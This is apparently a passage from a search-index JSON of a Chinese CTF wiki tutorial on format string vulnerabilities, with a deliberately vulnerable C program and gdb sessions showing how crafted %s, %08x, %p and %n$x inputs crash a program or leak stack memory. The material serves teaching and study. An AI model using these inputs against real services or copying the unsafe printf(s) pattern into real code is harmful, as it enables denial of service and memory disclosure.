            "text": "\u901a\u5e38\u6765\u8bf4\uff0c\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u662f\u6700\u4e3a\u7b80\u5355\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u56e0\u4e3a\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165\u82e5\u5e72\u4e2a%s\u5373\u53ef  %s%s%s%s%s%s%s%s%s%s%s%s%s%s  \u8fd9\u662f\u56e0\u4e3a\u6808\u4e0a\u4e0d\u53ef\u80fd\u6bcf\u4e2a\u503c\u90fd\u5bf9\u5e94\u4e86\u5408\u6cd5\u7684\u5730\u5740\uff0c\u6240\u4ee5\u603b\u662f\u4f1a\u6709\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\u3002\u8fd9\u4e00\u5229\u7528\uff0c\u867d\u7136\u653b\u51fb\u8005\u672c\u8eab\u4f3c\u4e4e\u5e76\u4e0d\u80fd\u63a7\u5236\u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u6837\u5374\u53ef\u4ee5\u9020\u6210\u7a0b\u5e8f\u4e0d\u53ef\u7528\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u8fdc\u7a0b\u670d\u52a1\u6709\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u5176\u53ef\u7528\u6027\uff0c\u4f7f\u670d\u52a1\u5d29\u6e83\uff0c\u8fdb\u800c\u4f7f\u5f97\u7528\u6237\u4e0d\u80fd\u591f\u8bbf\u95ee\u3002", 
            "title": "\u7a0b\u5e8f\u5d29\u6e83"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_3", 
            "text": "\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c   \u6cc4\u9732\u6808\u5185\u5b58  \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c  \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58    \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58  \u5229\u7528GOT\u8868\u5f97\u5230libc\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83libc\u51fd\u6570\u5730\u5740  \u76f2\u6253\uff0cdump\u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002", 
            "title": "\u6cc4\u9732\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_4", 
            "text": "\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f  ##include  stdio.h  int   main ()   { \n   char   s [ 100 ]; \n   int   a   =   1 ,   b   =   0x22222222 ,   c   =   - 1 ; \n   scanf ( %s ,   s ); \n   printf ( %08x.%08x.%08x.%s \\n ,   a ,   b ,   c ,   s ); \n   printf ( s ); \n   return   0 ;  }   \u7136\u540e\uff0c\u6211\u4eec\u7b80\u5355\u7f16\u8bd1\u4e00\u4e0b  \u279c  leakmemory git: ( master )  \u2717 make           \ngcc -fno-stack-protector -o leakmemory leakmemory.c\nleakmemory.c: In  function  \u2018main\u2019:\nleakmemory.c:7:10: warning: format not a string literal and no format arguments  [ -Wformat-security ] \n   printf ( s ) ; \n          ^  \u53ef\u4ee5\u770b\u51fa\uff0c\u7f16\u8bd1\u5668\u6307\u51fa\u4e86\u6211\u4eec\u7684\u7a0b\u5e8f\u4e2d\u6ca1\u6709\u7ed9\u51fa\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u53c2\u6570\u7684\u95ee\u9898\u3002\u4e0b\u9762\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\uff0c\u5982\u4f55\u83b7\u53d6\u5bf9\u5e94\u7684\u6808\u5185\u5b58\u3002  \u6839\u636eC\u8bed\u8a00\u7684\u8c03\u7528\u89c4\u5219\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4f1a\u6839\u636e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f4\u63a5\u4f7f\u7528\u6808\u4e0a\u81ea\u9876\u5411\u4e0a\u7684\u53d8\u91cf\u4f5c\u4e3a\u5176\u53c2\u6570(64\u4f4d\u4f1a\u6839\u636e\u5176\u4f20\u53c2\u7684\u89c4\u5219\u8fdb\u884c\u83b7\u53d6)\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd32\u4f4d\u3002", 
            "title": "\u6cc4\u9732\u6808\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_5", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u83b7\u53d6\u6808\u4e0a\u53d8\u91cf\u7684\u6570\u503c\u3002\u6211\u4eec\u53ef\u4ee5\u8bd5\u4e00\u4e0b\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 ./leakmemory\n%08x.%08x.%08x    00000001 .22222222.ffffffff.%08x.%08x.%08x\nffcfc400.000000c2.f765a6bb%                             \u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u786e\u5b9e\u5f97\u5230\u4e86\u4e00\u4e9b\u5185\u5bb9\u3002\u4e3a\u4e86\u66f4\u52a0\u7ec6\u81f4\u7684\u89c2\u5bdf\uff0c\u6211\u4eec\u5229\u7528GDB\u6765\u8c03\u8bd5\u4e00\u4e0b\uff0c\u4ee5\u4fbf\u4e8e\u9a8c\u8bc1\u6211\u4eec\u7684\u60f3\u6cd5\uff0c\u8fd9\u91cc\u5220\u9664\u4e86\u4e00\u4e9b\u4e0d\u5fc5\u8981\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ea\u5173\u6ce8\u4ee3\u7801\u6bb5\u4ee5\u53ca\u6808\u3002  \u9996\u5148\uff0c\u542f\u52a8\u7a0b\u5e8f\uff0c\u5c06\u65ad\u70b9\u4e0b\u8f7dprintf\u51fd\u6570\u5904  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330  \u4e4b\u540e\uff0c\u8fd0\u884c\u7a0b\u5e8f  gef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%08x.%08x.%08x  \u6b64\u65f6\uff0c\u7a0b\u5e8f\u7b49\u5f85\u6211\u4eec\u7684\u8f93\u5165\uff0c\u8fd9\u65f6\u6211\u4eec\u8f93\u5165%08x.%08x.%08x\uff0c\u7136\u540e\u6572\u51fb\u56de\u8f66\uff0c\u662f\u7a0b\u5e8f\u7ee7\u7eed\u8fd0\u884c\uff0c\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u9996\u5148\u65ad\u5728\u4e86\u7b2c\u4e00\u6b21\u8c03\u7528printf\u51fd\u6570\u7684\u4f4d\u7f6e  Breakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd08\u2502+0x1c: 0x000000c2  \u53ef\u4ee5\u770b\u51fa\uff0c\u6b64\u65f6\u6b64\u65f6\u5df2\u7ecf\u8fdb\u5165\u4e86printf\u51fd\u6570\u4e2d\uff0c\u6808\u4e2d\u7b2c\u4e00\u4e2a\u53d8\u91cf\u4e3a\u8fd4\u56de\u5730\u5740\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u7b2c\u4e09\u4e2a\u53d8\u91cf\u4e3aa\u7684\u503c\uff0c\u7b2c\u56db\u4e2a\u53d8\u91cf\u4e3ab\u7684\u503c\uff0c\u7b2c\u4e94\u4e2a\u53d8\u91cf\u4e3ac\u7684\u503c\uff0c\u7b2c\u516d\u4e2a\u53d8\u91cf\u4e3a\u6211\u4eec\u8f93\u5165\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u3002\u7ee7\u7eed\u8fd0\u884c\u7a0b\u5e8f  gef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%08x.%08x.%08x  \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u8f93\u51fa\u4e86\u6bcf\u4e00\u4e2a\u53d8\u91cf\u5bf9\u5e94\u7684\u6570\u503c\uff0c\u5e76\u4e14\u65ad\u5728\u4e86\u4e0b\u4e00\u4e2aprintf\u5904  Breakpoint  1 , __printf  ( format = 0xffffcd10  %08x.%08x.%08x )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   %08x.%08x.%08x \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  %08x.%08x.%08x    \u2190  $eax \n0xffffcd14\u2502+0x18:  .%08x.%08x \n0xffffcd18\u2502+0x1c:  x.%08x   \u6b64\u65f6\uff0c\u7531\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e3a%x%x%x\uff0c\u6240\u4ee5\uff0c\u7a0b\u5e8f \u4f1a\u5c06\u6808\u4e0a\u76840xffffcd04\u53ca\u5176\u4e4b\u540e\u7684\u6570\u503c\u5206\u522b\u4f5c\u4e3a\u7b2c\u4e00\uff0c\u7b2c\u4e8c\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u6309\u7167int\u578b\u8fdb\u884c\u89e3\u6790\uff0c\u5206\u522b\u8f93\u51fa\u3002\u7ee7\u7eed\u8fd0\u884c\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u5982\u4e0b\u7ed3\u679c\u53bb\uff0c\u786e\u5b9e\u548c\u60f3\u8c61\u4e2d\u7684\u4e00\u6837\u3002  gef\u27a4  c\nContinuing.\nffffcd10.000000c2.f7e8b6bb [ Inferior  1   ( process  57077 )  exited normally ]   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528%p\u6765\u83b7\u53d6\u6570\u636e\uff0c\u5982\u4e0b  % p .% p .% p  00000001.22222222 . ffffffff .% p .% p .% p  0xfff328c0 . 0xc2 . 0xf75c46bb %       \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6bcf\u6b21\u5f97\u5230\u7684\u7ed3\u679c\u90fd\u4e00\u6837 \uff0c\u56e0\u4e3a\u6808\u4e0a\u7684\u6570\u636e\u4f1a\u56e0\u4e3a\u6bcf\u6b21\u5206\u914d\u7684\u5185\u5b58\u9875\u4e0d\u540c\u800c\u6709\u6240\u4e0d\u540c\uff0c\u8fd9\u662f\u56e0\u4e3a\u6808\u662f\u4e0d\u5bf9\u5185\u5b58\u9875\u505a\u521d\u59cb\u5316\u7684\u3002  \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u4e0a\u9762\u7ed9\u51fa\u7684\u65b9\u6cd5\uff0c\u90fd\u662f\u4f9d\u6b21\u83b7\u5f97\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u6211\u4eec\u6709\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u83b7\u53d6\u6808\u4e2d\u88ab\u89c6\u4e3a\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u503c\u5462 \uff1f\u80af\u5b9a\u662f\u53ef\u4ee5\u7684\u5566\u3002\u65b9\u6cd5\u5982\u4e0b  %n$x  \u5229\u7528\u5982\u4e0b\u7684\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u7b2cn+1\u4e2a\u53c2\u6570\u7684\u6570\u503c\u3002\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u8981\u8bf4\u662f\u5bf9\u5e94\u7b2cn+1\u4e2a\u53c2\u6570\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u683c\u5f0f\u5316\u53c2\u6570\u91cc\u9762\u7684n\u6307\u7684\u662f\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u7b2cn\u4e2a\u8f93\u51fa\u53c2\u6570\uff0c\u90a3\u76f8\u5bf9\u4e8e\u8f93\u51fa\u51fd\u6570\u6765\u8bf4\uff0c\u5c31\u662f\u7b2cn+1\u4e2a\u53c2\u6570\u4e86\u3002  \u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u4ee5gdb\u8c03\u8bd5\u4e00\u4e0b\u3002  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%3 $x \n\nBreakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192   %3 $x \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192   %3 $x \n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%3 $x \n\nBreakpoint  1 , __printf  ( format = 0xffffcd10  %3 $x )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192   %3 $x \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192   %3 $x \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14:  %3 $x      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce00  \u2192  0x00000001\n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\nf7e8b6bb [ Inferior  1   ( process  57442 )  exited normally ]   \u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u786e\u5b9e\u83b7\u5f97\u4e86printf\u7684\u7b2c4\u4e2a\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u503cf7e8b6bb\u3002", 
            "title": "\u83b7\u53d6\u6808\u53d8\u91cf\u6570\u503c"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_6", 
            "text": "\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u5f97\u6808\u53d8\u91cf\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u9700\u8981\u7528\u5230%s\u4e86\u3002\u8fd9\u91cc\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u7a0b\u5e8f\uff0c\u8fdb\u884cgdb\u8c03\u8bd5\uff0c\u5982\u4e0b  \u279c  leakmemory git: ( master )  \u2717 gdb leakmemory\ngef\u27a4  b  printf \nBreakpoint  1  at 0x8048330\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/leakmemory/leakmemory \n%s\n\nBreakpoint  1 , __printf  ( format = 0x8048563  %08x.%08x.%08x.%s\\n )  at printf.c:28 28   printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccec ,  l8 ]  8 \n0xffffccec\u2502+0x00: 0x080484bf  \u2192   main+84  add esp, 0x20     \u2190  $esp \n0xffffccf0\u2502+0x04: 0x08048563  \u2192   %08x.%08x.%08x.%s \n0xffffccf4\u2502+0x08: 0x00000001\n0xffffccf8\u2502+0x0c: 0x22222222\n0xffffccfc\u2502+0x10: 0xffffffff\n0xffffcd00\u2502+0x14: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x18: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x1c: 0x000000c2\ngef\u27a4  c\nContinuing. 00000001 .22222222.ffffffff.%s\n\nBreakpoint  1 , __printf  ( format = 0xffffcd10  %s )  at printf.c:28 28   in printf.c\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  code:i386  ] \u2500\u2500\u2500\u2500\n   0xf7e44667  fprintf+23      inc    DWORD PTR  [ ebx+0x66c31cc4 ] \n   0xf7e4466d                  nop    \n   0xf7e4466e                  xchg   ax, ax\n \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x080484ce  \u2192   main+99  add esp, 0x10     \u2190  $esp \n0xffffcd00\u2502+0x04: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd04\u2502+0x08: 0xffffcd10  \u2192  0xff007325  ( %s ? ) \n0xffffcd08\u2502+0x0c: 0x000000c2\n0xffffcd0c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd10\u2502+0x14: 0xff007325  ( %s ? )      \u2190  $eax \n0xffffcd14\u2502+0x18: 0xffffce3c  \u2192  0xffffd074  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd18\u2502+0x1c: 0x000000e0\ngef\u27a4  c\nContinuing.\n%s [ Inferior  1   ( process  57488 )  exited normally ]   \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u7b2c\u4e8c\u6b21\u6267\u884cprintf\u51fd\u6570\u7684\u65f6\u5019\uff0c\u786e\u5b9e\u662f\u5c060xffffcd04\u5904\u7684\u53d8\u91cf\u89c6\u4e3a\u5b57\u7b26\u4e32\u53d8\u91cf\uff0c\u8f93\u51fa\u4e86\u5176\u6570\u503c\u6240\u5bf9\u5e94\u7684\u5730\u5740\u5904\u7684\u5b57\u7b26\u4e32\u3002  